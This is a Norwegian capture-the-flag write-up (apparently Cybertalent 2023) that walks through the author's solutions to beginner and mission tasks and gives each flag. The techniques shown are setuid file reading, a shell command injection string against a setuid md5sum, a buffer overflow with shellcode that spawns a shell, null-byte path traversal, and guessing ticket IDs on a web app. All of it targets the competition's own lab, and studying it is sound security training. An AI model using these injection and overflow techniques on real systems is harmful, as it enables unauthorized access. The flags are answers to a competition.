## Grunnleggende

### 1.1_scoreboard
Intro oppgave, scoreboard FLAGG er kommandoen for å få poeng.
```
login@corax:~/1_grunnleggende/1_scoreboard$ cat FLAGG
For å løse denne oppgaven må du skrive:

$ scoreboard 7430bdab3443bdea641e754313d041d6
```

FLAGG
```
login@corax:~/1_grunnleggende/1_scoreboard$ scoreboard 7430bdab3443bdea641e754313d041d6
Kategori: 1. Grunnleggende
Oppgave:  1.1_scoreboard
Svar:     7430bdab3443bdea641e754313d041d6
Poeng:    10

Gratulerer, korrekt svar!
```

### 1.2_setuid

Som vist i output til ls -la kan har vi rettigheter til å kjøre cat programmet med rettigheter (set-uid) til basic2. Vi kan med det programmet lese flagget.

```
login@corax:~/1_grunnleggende/2_setuid$ cat FLAGG
cat: FLAGG: Permission denied
login@corax:~/1_grunnleggende/2_setuid$ ls -la
total 108
drwxr-xr-x 2 basic2 login  4096 des.  19 19:00 .
drwxr-xr-x 9 login  login  4096 des.  19 19:00 ..
-r-sr-xr-x 1 basic2 login 44016 des.  19 19:00 cat
-r-------- 1 basic2 login   435 des.  24 23:08 FLAGG
-r-sr-xr-x 1 basic2 login 48144 des.  19 19:00 id
-r--r--r-- 1 basic2 login  1767 des.  19 19:00 LESMEG.md
login@corax:~/1_grunnleggende/2_setuid$ ./cat FLAGG
Ved å sette suid på cat kan man lese filer som om man var en annen bruker.
I dette tilfellet får du tilgang til oppgavens flagg:

╭────────────────────────────────────────╮
│    85df372e4744caa65f16ecafb39c2a38    │
╰────────────────────────────────────────╯
```
FLAGG
```
login@corax:~/1_grunnleggende/2_setuid$ scoreboard 85df372e4744caa65f16ecafb39c2a38
Kategori: 1. Grunnleggende
Oppgave:  1.2_setuid
Svar:     85df372e4744caa65f16ecafb39c2a38
Poeng:    10

Gratulerer, korrekt svar!
```

### 1.3_injection
md5sum er også et set-uid program, det kjører med rettigheter til basic3. md5sum tar imot ett argument, men vi kan komme rundt det ved å sende inn som en streng. ; operatoren i bash fungerer som en "sekvensiell" kommando. så først blir md5sum av flagg kjørt ; så med rettighetene til basic3 kjører vi lesing av flagget.
```
login@corax:~/1_grunnleggende/3_injection$ ./md5sum "FLAGG; cat FLAGG"
Kjører kommando:
/usr/bin/md5sum FLAGG; cat FLAGG

Resultat:
033d05d362d1bb186150bac3c8b8b936  FLAGG

Ved bruk av suid må man være spesielt forsiktig så en angriper ikke kan utnytte
de ekstra tilgangene til noe ondsinnet.

Her klarte du å lese en fil du ikke egentlig skulle se!

╭────────────────────────────────────────╮
│    cc04b2deb84a5260e06d8aca1002171b    │
╰────────────────────────────────────────╯

login@corax:~/1_grunnleggende/3_injection$ scoreboard cc04b2deb84a5260e06d8aca1002171b
Kategori: 1. Grunnleggende
Oppgave:  1.3_injection
Svar:     cc04b2deb84a5260e06d8aca1002171b
Poeng:    10

Gratulerer, korrekt svar!
```

### 1.4_overflow
```

login@corax:~/1_grunnleggende/4_overflow$ export SHC=$(cat sample_shellcode)
login@corax:~/1_grunnleggende/4_overflow$ ./overflow "AA$(echo $SHC)ABCDEFGHAAAAAAAABBBBBBBBCCCCCCCC000000"

Before strcpy:
above = 0x               0
below = 0x6867666564636261

After strcpy:
above = 0x4847464544434241
below = 0x6867666564636261

Stackdump:
0x7fff5fb77300   00 00 00 00 02 00 00 00  |........|
0x7fff5fb772f8   33 e8 5c 93 5a 55 00 00  |3.\.ZU..|
0x7fff5fb772f0   00 00 00 00 00 00 00 00  |........|
stored rip       30 30 30 30 30 30 00 00  |000000..|
stored rbp       43 43 43 43 43 43 43 43  |CCCCCCCC|
0x7fff5fb772d8   42 42 42 42 42 42 42 42  |BBBBBBBB|
0x7fff5fb772d0   41 41 41 41 41 41 41 41  |AAAAAAAA|
&above           41 42 43 44 45 46 47 48  |ABCDEFGH|
0x7fff5fb772c0   54 5f 6a 3b 58 99 0f 05  |T_j;X...|
0x7fff5fb772b8   62 69 6e 2f 2f 73 68 57  |bin//shW|
0x7fff5fb772b0   05 48 31 f6 56 48 bf 2f  |.H1.VH./|
0x7fff5fb772a8   05 5f 48 97 48 89 fe 0f  |._H.H...|
&buffer          41 41 6a 71 6a 6b 58 0f  |AAjqjkX.|
&below           61 62 63 64 65 66 67 68  |abcdefgh|
&width           08 00 00 00 00 00 00 00  |........|
&shellcode_ptr   30 30 30 30 30 30 00 00  |000000..|
&p               80 72 b7 5f ff 7f 00 00  |.r._....|

above is correct!
Next step is to adjust the stored rip to point to shellcode
$ ls
FLAGG  LESMEG.md  overflow  overflow.c  sample_shellcode
$ cat FLAGG
Veldig bra jobbet!
Du har nå et fullverdig shell med rettigheter til en annen bruker.
Bruk kommandoen `exit` for å gå tilbake til den vanlige brukeren din.

Husk å levere flagget :)

╭────────────────────────────────────────╮
│    dbb5c2b12d9d494c63053011bb4e1e04    │
╰────────────────────────────────────────╯

$ ^C
$
login@corax:~/1_grunnleggende/4_overflow$ scoreboard dbb5c2b12d9d494c63053011bb4e1e04
Kategori: 1. Grunnleggende
Oppgave:  1.4_overflow
Svar:     dbb5c2b12d9d494c63053011bb4e1e04
Poeng:    10

Gratulerer, korrekt svar!

```

### 1.5_nettverk 

```
login@corax:~$ ./1.6_client.py
Dette er en grunnleggende introduksjon til nettverksprogrammering.
Når du har åpnet ti nye tilkoblinger til denne serveren vil du få videre instruksjoner på denne socketen.

Du vil nå få tilsendt et 32-bits heltall i `network byte order` i hver av de ti andre sesjonene.
Summer alle, og send resultatet tilbake på denne socketen.
Det er mange måter å konvertere data på. En av dem er `struct.unpack`.

Neste melding sendes fordelt over de ti sesjonene.
For å unngå å blokkere mens du leser kan du for eksempel bruke `select.select()` eller `socket.settimeout(0)`.

Husk at utf-8 kan ha multi-byte tegn 😊

╭────────────────────────────────────────╮
│ Gratulerer!                            │
│                                        │
│ Her er flagget:                        │
│                                        │
├────────────────────────────────────────┤
│    85dabd2b27904358bab2eccbd16dcba4    │
╰────────────────────────────────────────╯

login@corax:~$ scoreboard 85dabd2b27904358bab2eccbd16dcba4
Kategori: 1. Grunnleggende
Oppgave:  1.5_nettverk
Svar:     85dabd2b27904358bab2eccbd16dcba4
Poeng:    10

Gratulerer, korrekt svar!
```

1.6_client.py
```
#!/usr/bin/env python3

import socket
import struct
import select

TCP_IP = "127.0.0.1"
TCP_PORT = 10015


def main():
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((TCP_IP, TCP_PORT))
    print(conn.recv(4096).decode("utf-8"))

    conns = [None] * 10
    for idx, con in enumerate(conns):
        conns[idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conns[idx].connect((TCP_IP, TCP_PORT))
    print(conn.recv(4096).decode("utf-8"))

    sum = 0
    for con in conns:
        sum = sum + struct.unpack('!i', con.recv(32))[0]
    conn.send(struct.pack('!i',sum))
    print(conn.recv(4096).decode("utf-8"))

    while True:
        unblockeds = select.select(conns, list(), list())[0]
        if not unblockeds:
            break
        for sock in unblockeds:
            print(sock.recv(1024).decode(), end="")


if __name__ == "__main__":
    main()
```

### 1.6_reversing
```
login@corax:~/1_grunnleggende/6_reversing$ ls -la
total 36
drwxr-xr-x 2 basic6 login  4096 des.  19 19:00 .
drwxr-xr-x 9 login  login  4096 des.  19 19:00 ..
-r-sr-xr-x 1 basic6 login 16360 des.  19 19:00 check_password
-r-------- 1 basic6 login  1121 des.  19 19:00 check_password.c
-r-------- 1 basic6 login    40 des.  24 23:08 FLAGG
-r--r--r-- 1 basic6 login  1413 des.  19 19:00 LESMEG.md
login@corax:~/1_grunnleggende/6_reversing$ ./check_password
Bruk: ./check_password PASSORD

Sjekk passord gitt som første argument.
Hvis passordet er korrekt startes et nytt shell med utvidete rettigheter.
login@corax:~/1_grunnleggende/6_reversing$ ./check_password asdf
Feil passord :(
Du stoppet på steg 1
```
La oss ta check_password binaryen for en nærmere inspeksjon i Ghidra

```
lokalt $ scp etj:~/1_grunnleggende/6_reversing/check_password .
```
når vi åpner programmet i ghidra ser vi rekkefølgen passordet forventes å bli lest i. ved å følge kodelogikken er passordet "Reverse_engineering_er_morsomt__" 

```
login@corax:~/1_grunnleggende/6_reversing$ ./check_password Reverse_engineering_er_morsomt__
Korrekt passord!
$ ls
check_password  check_password.c  FLAGG  LESMEG.md
$ cat FLAGG
FLAGG: c6d13b54e14ec9fbf8861313e46adeca
$
login@corax:~/1_grunnleggende/6_reversing$ scoreboard c6d13b54e14ec9fbf8861313e46adeca
Kategori: 1. Grunnleggende
Oppgave:  1.6_reversing
Svar:     c6d13b54e14ec9fbf8861313e46adeca
Poeng:    10

Gratulerer, korrekt svar!
```
### 1.7_path_traversal
les_bok bruker setuid til eieren av flagget. vi kan utnytte det programmet til å path traverse (med ..) til directoryet til flagget og lese det.
```
login@corax:~/1_grunnleggende/7_path_traversal$ ./les_bok ../FLAGG

Kategori: 1. Grunnleggende
Oppgave:  1.7_path_traversal
Svar:     883b891242197e0f3dc38b472ca06950
Poeng:    10

Gratulerer, korrekt svar!
```

### 1.8_path_traversal_bonus
les_bok programmet legger til en hardkodet .txt ending på filinput. nøkkelen her er å avbryte den lesingen med en nullbyte.
```
login@corax:~/1_grunnleggende/7_path_traversal$ ./les_bok ../BONUS_FLAGG%00
FLAGG: e012ffcf5dc95e37bea6ef6d62c726d5

login@corax:~/1_grunnleggende/7_path_traversal$ scoreboard e012ffcf5dc95e37bea6ef6d62c726d5
Kategori: 1. Grunnleggende
Oppgave:  1.8_path_traversal_bonus
Svar:     e012ffcf5dc95e37bea6ef6d62c726d5
Poeng:    10

Gratulerer, korrekt svar!
```

## Oppdrag

### 2.0.1_manipulaite_1
```
Velkommen til ManipulAIte!
Dette er en treningssimulator i sosial ingeniørkunst for deg å øve deg i. Hent ut flagget fra spillet for å få verdifull trening.
Trykk enter for å starte spillet
Skriv 'exit' for å avslutte.

Operatører har sikret seg SHA-256-sjekksummen av nøkkelen, og denne kan brukes for å bekrefte at du har innhentet den korrekte nøkkelen:
sha256("FLAG{??????}") = 00cd8dbd5f1d8f3e33ff6783f78aa2a3015a95ead0dfd333d19b796981fd565e

MERK: Skriv på engelsk for å skjule din nasjonalitet.


Generating response...

Welcome to Intelligence Hacker Simulator: Social Engineering! Your goal is to extract sensitive information from various employees of a fictional company. Are you ready to begin?
Message: yes
Generating response...

Level 1:

Scenario: You receive an email from an employee of the company named John, who is in the IT department. He mentions that there is a security breach and asks for your assistance in verifying your account details for a security audit.

A) Reply to the email with your account details.
B) Call John directly to discuss the security breach.
C) Forward the email to your supervisor for guidance.
D) Ignore the email and delete it.

Please choose A, B, C, or D to make your choice.
Message: B
Generating response...

Level 2:

Scenario: You call John directly to discuss the security breach. He sounds concerned and appreciates your proactive approach. He mentions that there has been a recent increase in phishing attempts and advises you to be cautious with any emails asking for personal information.

A) Share your credentials over the phone for verification.
B) Ask John for specific details about the security breach.
C) Thank John for the information and end the call.
D) Request John's assistance in changing your account password.

Please choose A, B, C, or D to make your choice.
Message: D
Generating response...

Level 3:

Scenario: You request John's assistance in changing your account password. He agrees to help and asks you to provide him with your current password so that he can initiate the process.

A) Provide John with your current password.
B) Ask John to guide you through changing your password yourself.
C) Inform John that you are uncomfortable sharing your password and ask for an alternative solution.
D) End the call and report the situation to your supervisor.

Please choose A, B, C, or D to make your choice.
Message: B
Generating response...

Level 4:

Scenario: You ask John to guide you through changing your password yourself. He agrees and provides you with step-by-step instructions on how to update your password securely.

A) Follow John's instructions and update your password.
B) Tell John that you prefer he changes the password for you.
C) Express gratitude to John for his assistance and end the call.
D) Ignore John's instructions and continue using your current password.

Please choose A, B, C, or D to make your choice.
Message: B
Generating response...

Congratulations! You did it! Here is the key: FLAG{16cd6f49b88ba2d8bc5a15c7c8899b17}

Thank you for playing Intelligence Hacker Simulator: Social Engineering. If you would like to play again, just let me know!
```

```
login@corax:~/2_oppdrag$ scoreboard 16cd6f49b88ba2d8bc5a15c7c8899b17
Kategori: 2. Initiell aksess
Oppgave:  2.0.1_manipulaite_1
Svar:     16cd6f49b88ba2d8bc5a15c7c8899b17
Poeng:    10

Bra jobba! Dette er trening som du kan trenge senere.
```

### 2.0.2_anvilticket_1

Nettsiden har IT-support tickets, denne har en ticket "share" knapp som genererer en url som gjør at du kan dele ticketen din med andre, eksempelvis:
```
Anyone with this url can view this ticket https://anvilticket.cybertalent.no/invite/c405dd5e-a505-11ee-8874-02420a0596ea
```
Det går en post request mot /share/{TICKET_ID}, etter en rask skjekk om det lar seg dele med andre tickets viser at det er svak mot permission checks. dvs vi kan dele en vilkårlig ticketid vi kan gjette for å kunne se innholdet.

innholdet på ticket 6 gir flagg:

<img alt="anvilticket1" src="https://github.com/BirkJohannessen/writeups/blob/master/cybertalent23/imgs/anvilticket1.png">

```
Kategori: 2. Initiell aksess
Oppgave:  2.0.2_anvilticket_1
Svar:     d053d5c7331a06f3a88c3cc1b71af771
Poeng:    10

Godt jobbet!
```

## Skjulte flagg

### 4_corax_dev_shm
Fant dette flagget i fjor ved find kommandoen under rekoginisering av corax. Det er tilgjengelig i år også.
```
$ find / -name .secret 2>/dev/null
/dev/shm/.secret
$ cat /dev/shm/.secret 
FLAGG: 976d0c702af44c422c36abbc533ae992
```

```
Kategori: 4. Skjulte flagg
Oppgave:  4_corax_dev_shm
Svar:     976d0c702af44c422c36abbc533ae992
Poeng:    0

Gratulerer, korrekt svar!
```
